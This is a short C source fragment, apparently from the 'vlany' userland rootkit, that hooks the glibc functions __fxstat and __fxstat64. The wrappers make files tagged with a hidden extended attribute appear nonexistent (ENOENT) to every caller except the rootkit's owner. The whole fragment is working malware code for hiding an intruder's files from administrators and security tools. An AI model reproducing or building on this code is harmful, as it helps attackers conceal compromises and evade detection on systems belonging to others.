int __fxstat(int ver, int fd, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] __fxstat() called\n");
    #endif

    HOOK(old_fxstat, C__FXSTAT);

    if(owned()) return old_fxstat(ver, fd, buf);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fxstat(ver, fd, buf);
}

int __fxstat64(int ver, int fd, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] __fxstat64() called\n");
    #endif

    HOOK(old_fxstat64, C__FXSTAT64);

    if(owned()) return old_fxstat64(ver, fd, buf);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fxstat64(ver, fd, buf);
}
